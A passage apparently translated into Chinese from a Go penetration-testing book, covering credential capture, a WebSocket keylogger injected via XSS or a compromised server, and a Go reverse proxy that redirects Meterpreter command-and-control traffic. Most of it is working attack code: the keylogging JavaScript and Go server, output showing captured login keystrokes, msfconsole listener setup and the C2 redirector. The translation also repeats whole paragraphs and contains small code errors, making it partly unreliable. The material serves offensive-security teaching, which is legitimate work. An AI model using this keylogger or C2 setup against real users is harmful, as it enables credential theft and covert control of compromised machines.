
第一个值得注意的是，你导入了 `github.com/Sirpusen/logrus`。这是一个结构化日志包，我们倾向于使用它而不是标准的 Go `log` 包。它提供了更多可配置的日志选项以进行更好的错误处理。要使用此包，你需要确保在此之前运行了 `get`。

接下来，你定义了 `login()` 处理函数。希望这个模式看起来很熟悉。在这个函数内部，你使用 `log.WithFields()` 来写入你捕获的数据。你显示了当前时间、用户-agent 和请求者的 IP 地址。你还调用了 `FormValue(string)` 来捕捉提交的用户名 (`_user`) 和密码 (`_pass`) 值。你从 `index.html` 并通过定位每个用户名和密码的输入元素获取这些值。你的服务器需要显式地与文件中存在的字段名称对齐。

你只需要几十行代码就可以处理这一切。列表 4-8 显示了程序的全貌。

# KEYLOGGING WITH THE WEBSOCKET API

`WebSocket API` (`WebSockets`)，一种全双工协议，在几年中增加了人气，许多浏览器都支持它。它为 Web 应用程序服务器和客户端提供了通信的方式。最重要的是，它允许服务器向客户端发送消息而无需轮询。

`WebSockets` 用于构建“实时”应用程序（如聊天和游戏），但你也可以将其用于邪恶目的，例如在应用程序中注入键盘记录器以捕捉用户按下的每一个键。为了想象你发现了一个容易受到跨站脚本攻击（一种第三方可以在受害者浏览器中运行任意 JavaScript 的漏洞）的应用程序，或者你攻破了一个 Web 服务器，允许你修改应用程序源代码。任何一种场景都可以让你包含一个远程 JavaScript 基础设施来处理来自客户端的 WebSocket 连接并处理输入的按键。

为了演示，你将使用 JS Bin (`http://jsbin.com`)。JS Bin 是一个可以在其中测试 HTML 和 JavaScript 代码的在线平台。在浏览器中导航到 JS Bin并将并将 HTML 粘贴到左侧列中，完全替换默认代码：

```html
<!DOCTYPE html>
<html>
<head>
<title>Login</title>
</head>
<body>
<script src="http://localhost:8080/k.js"></script>
<form action="/login" method="post">
<input name="username"/>
<input name="password"/>
<input type="submit"/>
</form>
</body>
</html>
```

在屏幕的右侧，你将看到渲染后的表单。正如你可能注意到的，你包含了一个 `<script>` 标签，其 `src` 属性被设置为 `http://localhost:8080/k.js`。这将将是用于创建 WebSocket 连接并将用户输入发送到服务器的 JavaScript 代码。

你的服务器将执行两件事：处理 WebSocket 和提供 JavaScript 文件。首先，让我们先把 JavaScript 处理掉，毕竟毕竟，这本书是关于 Go 的，而不是 JavaScript。请查看 [https://github.com/gopherjs/gopherjs/](https://github.com/gopherjs/gopherjs/) 以了解如何用 Go 编写 JavaScript。JavaScript 代码显示在这里：

```javascript
function() {
  var conn = new WebSocket("ws://{{.}}/ws");
  document.onkeypress = keypress;
  function keypress(evt) {
    s = String.fromCharCode(evt.which);
    conn.send(s);
  }
}();
```

这段 JavaScript 代码处理按键事件。每当按下按键时，代码都会通过 WebSocket 将按键发送到 `ws{{}}/ws` 资源。请记住，`{{}}` 值是一个 Go 模板占位符，代表当前的上下文。该资源代表一个 WebSocket URL，它将根据你传递给模板的字符串来填充服务器位置信息。我们稍后会讨论这一点。对于这个示例，你将在一个名为 `logger.js` 的文件中看到这段 JavaScript。

但等一下，我们说过它是作为 `k.js` 提供的！我们之前显示的 HTML 也显式地使用了 `k.js`。这是怎么回事？`logger.js` 是一个 Go 模板，而不是真正的 JavaScript 文件。你将使用 `k.js` 作为与你的路由器匹配的模式。当匹配成功时，你的服务器将渲染存储在 `logger.js` 文件中的模板，并附带代表 WebSocket 连接到的主机信息的上下文数据。你可以通过查看列表 4-9 的服务器代码来了解它是如何工作的。

```go
import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
	listenAddr string
	wsAddr string
	jsTemplate *template.Template
)

func init() {
	flag.StringVar(&listenAddr, "listen-addr", "", "监听的地址")
	flag.StringVar(&wsAddr, "ws-addr", "", "WebSocket 连接的地址")
	flag.Parse()

	var err error
	jsTemplate, err = template.ParseFiles("logger.js")
	if err != nil {
		panic(err)
	}
}

func serveWS(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		http.Error(w, "", 500)
		return
	}
	defer conn.Close()
	fmt.Printf("Connection from %s\n", conn.RemoteAddr().String())
	for {
		msg, err := conn.ReadMessage()
		if err != nil {
			return
		}
		fmt.Printf("From %s: %s\n", conn.RemoteAddr().String(), string(msg))
	}
}

func serveFile(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/javascript")
	jsTemplate.Execute(w, wsAddr)
}

func main() {
```

此时此时，你还没有为你的模板提供任何上下文数据，也没有执行它。那很快就会发生。然而，首先你定义了一个函数 `serveWS()`，用它来处理 WebSocket 通信。你通过调用 `upgrader.Upgrade(http.ResponseWriter, *http.Request, http.Header)` 创建一个新的 `websocket.Conn` 实例。4. `Upgrade()` 方法将 HTTP 连接升级为使用 WebSocket 协议。这意味着任何由此函数处理的请求将升级为使用 WebSockets。你在无限循环中与连接进行交互，调用 `conn.ReadMessage()` 读取传入的消息 5. 如果你的 JavaScript 正常工作，这些消息应该包含捕获的按键。你将这些消息和客户端的远程 IP 地址写入 `stdout` 6.

可以说，你已经解决了创建 WebSocket 处理程序中最困难的部分。接下来，你创建了另一个名为 `serveFile` 的处理函数。此函数将检索并提供 JavaScript。你将 `k.js` 作为你的模式来与路由器进行匹配。当匹配成功时，你的服务器将渲染存储在 `logger.js` 文件中的模板，并附带代表 WebSocket 连接到主机的上下文数据。你可以通过查看列表 4-9 中的服务器代码来了解它是如何工作的。

此时，你还没有为你的模板提供任何上下文数据，也没有执行它。那很快就会发生。然而，首先你定义了一个函数 `serveWS()`，用它来处理 WebSocket 通信。你通过调用 `upgrader.Upgrade(http.ResponseWriter, *http.Request, http.Header)` 创建一个新的 `websocket.Conn` 实例。4. `Upgrade()` 方法将 HTTP 连接升级为使用 WebSocket 协议。这意味着任何由此函数处理的请求将升级为使用 WebSockets。你在无限循环中与连接进行交互，调用 `conn.ReadMessage()` 读取传入的消息 5. 如果你的 JavaScript 正常工作，这些消息应该包含捕获的按键。你将这些消息和客户端的远程 IP 地址写入 `stdout` 6.

可以说，你已经解决了创建 WebSocket 处理程序中最困难的部分。接下来，你创建了另一个名为 `serveFile` 的处理函数。此函数将检索并提供 JavaScript。你将 `k.js` 作为你的模式来与路由器进行匹配。当匹配成功时，你的服务器将渲染存储在 `logger.js` 文件中的模板，并附带代表 WebSocket 连接到主机的上下文数据。

```
$ run main.go -listen-addr=:8080 -ws-addr=:8081
Connection from 127.0.0.1:52345
From 127.0.0.1:52345: u
From 127.0.0.1:52345: s
From 127.0.0.1:52345: e
From 127.0.0.1:52345: r
From 127.0.0.1:52345: p
From 127.0.0.1:52345: @
From 127.0.0.1:52345: s
From 127.0.0.1:52345: s
From 127.0.0.1:52345: w
From 127.0.0.1:52345: o
From 127.0.0.1:52345: r
From 127.0.0.1:52345: d
From 127.0.0.1:52345: s
```

你做到了！它工作了！你的输出列出了在填写表单时按下的每一个按键。在这种情况下，是一组用户凭据。如果你遇到问题，请确保你作为命令行参数提供了准确的地址。此外，如果你尝试从 `localhost:8080` 以外的服务器调用 `k.js`，HTML 文件本身可能需要调整。

可以从多个方面改进此代码。首先，你可能希望将输出记录到文件或其他持久化存储中，而不是终端。这将让你在终端窗口关闭或服务器重启时不太丢失数据。此外，如果你的按键记录器同时记录多个客户端的按键，输出将混合数据，使得拼凑特定用户的凭据可能变得困难。你可以通过寻找更好的展示格式来避免这种情况，例如，根据唯一的客户端/端口源对按键进行分组。

# 多路用命令与控制

你已经到达 HTTP 服务器章节的最后一节。在这里，你将查看如何将 Meterpreter HTTP 连接多路复用到不同的后端控制服务器。Meterpreter 是 Metasploit 渗透框架中流行的、灵活的命令与控制（C2）套件。我们不会

不要过多地探讨 Metasploit 或 Meterpreter 的细节。如果你是初学者，我们建议你仔细阅读许多教程或文档网站之一。

在本节中，我们将介绍如何用 Go 语言创建一个反向 HTTP 代理，你可以根据 Host HTTP 头部动态地路由你的入站 Meterpreter 会话，这就像虚拟网站托管的工作原理一样：你不是在提供不同的文件和目录，而是将连接代理到不同的 Meterpreter 监听器。由于以下原因，这是一个非常有趣的用例。

首先，你的代理充当了重定向器的角色，允许你只暴露域名和 IP 地址，而不暴露你的 Metasploit 监听器。如果重定向器被列入黑名单，你只需移动它而无需移动 C2 服务器。其次，你可以将这里的概念扩展到执行“域名化”（domaining），这是一种利用受信任的第三方域名（通常来自云提供商）来绕过严格的出口控制的技术。我们在这里不会提供一个完全的示例，但我们强烈建议你深入研究，因为它非常强大，允许你出站受限的网络。最后，该用例演示了你如何在一组可能攻击不同目标组织的盟友团队中共享单个主机/端口组合。由于 80 和 443 是最可能的出口端口，你可以使用你的代理在这些端口监听，并智能地将连接路由到正确的监听器。

以下是计划。你将设置两个独立的 Meterpreter 反向 HTTP 监听器。在示例中，这些将位于 IP 地址为 `10.0.1.20` 的虚拟机上，但它们完全可以存在于不同的主机上，端口分别为 `10080` 和 `20080`。在实际情况下，只要代理可以访问这些端口，这些监听器就可以运行在任何地方。确保你已经安装了 Metasploit（Kali Linux 预装）；然后启动你的监听器。

```
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
> set LHOST 10.0.1.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 10080
> exploit -j z
[*] Exploit running as background job 1.
```

[*] Started HTTP reverse handler on http://10.0.1.20:10080

当你启动监听器时，将代理数据作为 `LHOST` 和 `LPORT` 值提供。然而，你将高级选项 `ReverseListenerBindAddress` 和 `ReverseListenerBindPort` 设置为你希望监听器启动的实际 IP 和 端口。这让你在端口使用上具有灵活性，同时允许你显式地标识代理主机——例如，如果你正在设置域名框架，这可能是一个主机名。

在第二个 Metasploit 实例上，你将进行类似的操作以在端口 `20080` 上启动另一个额外的监听器。这里的真实区别在于你绑定到了不同的端口：

```
$ msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter_reverse_http
> set LHOST 10.0.1.20
> set LPORT 80
> set ReverseListenerBindAddress 10.0.1.20
> set ReverseListenerBindPort 20080
> exploit -j z
[*] Exploit running as background job 1.
```

[*] Started HTTP reverse handler on http://10.0.1.20:20080

## 现在，让我们创建你的反向代理。列表 4-10 显示了完整的代码。

```go
package main

import (
    "log"
    "net/http"
    "net/http/httputil"
    "net/url"
    "github.com/gorilla/mux"
)

var (
    hostProxy = make(map[string]string)
    proxies = make(map[string]*httputil.ReverseProxy)
)

func init() {
    hostProxy["attacker1.com"] = "http://10.0.1.20:10080"
    hostProxy["attacker2.com"] = "http://10.0.1.20:20080"

    for k, v := range hostProxy {
        remote, err := url.Parse(v)
        if err != nil {
            log.Fatal("Unable to parse proxy")
        }
        proxies[k] = httputil.NewSingleHostProxy(remote)
    }
}

func main() {
    r := mux.NewRouter()
    for host, proxy := range proxies {
        r.Host(host).Handler(proxy)
    }
    log.Fatal(http.ListenAndServe(":80", r))
}
```

### 列表 4-10: 多路复 (multiplexer/main.go)

首先，你会注意到你导入了 `net/http/httputil` 包，它包含了辅助创建反向代理的功能。这可以让你避免需要从零开始创建一个。

在导入包之后，你定义了一对变量。两个变量都是 map（映射）。你将使用第一个变量 `hostProxy` 来将主机名映射到你想要路由到的 Metasploit 监听器的 URL。记住，你将根据你的代理收到的 Host 头部进行路由。维护这种映射是确定目的地的简单方法。
